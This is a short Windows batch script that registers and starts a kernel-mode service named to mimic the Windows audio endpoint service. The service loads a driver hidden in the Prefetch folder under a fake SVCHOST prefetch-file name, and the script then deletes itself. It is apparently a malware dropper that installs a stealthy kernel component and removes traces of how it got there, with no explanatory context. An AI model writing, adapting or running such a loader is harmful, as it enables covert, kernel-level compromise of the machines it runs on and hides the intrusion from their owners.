@echo off
cd %~dp0
sc create AudioEndpointBuilder_352 binpath=C:\Windows\Prefetch\SVCHOST.EXE-LB2XQ7N4.pf type=kernel
sc start AudioEndpointBuilder_352
del "%~f0"



